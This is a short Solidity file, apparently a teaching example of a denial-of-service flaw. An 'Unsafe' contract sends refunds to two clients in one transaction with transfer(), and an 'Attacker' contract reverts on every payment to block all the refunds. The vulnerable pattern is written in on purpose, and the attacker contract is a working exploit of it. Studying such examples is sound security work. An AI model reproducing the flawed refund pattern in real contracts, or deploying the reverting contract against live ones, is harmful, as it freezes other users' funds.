// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import "Teller.sol";

// 0xdbc4b2f195C8306ec925c0ABB6C5E92d41146b83

contract Unsafe is Teller {
    address payable client1;
    address payable client2; // Attacker address goes here.
    
    constructor(address payable c1, address payable c2) payable {
        client1 = c1;
        client2 = c2;
    }
    
    function refund() external {
        client1.transfer(1 ether);
        client2.transfer(1 ether);
    }
}

contract Attacker is Teller {
    receive() external payable {
        // Revert causes the Unsafe.refund() transaction to fail.
        // Event when attacker is refunded last (as Unsafe.client2)
        // it reverts the entire transaction, thus not allowing
        // every client of Unsafe to be refunded.
        revert();
    }
}
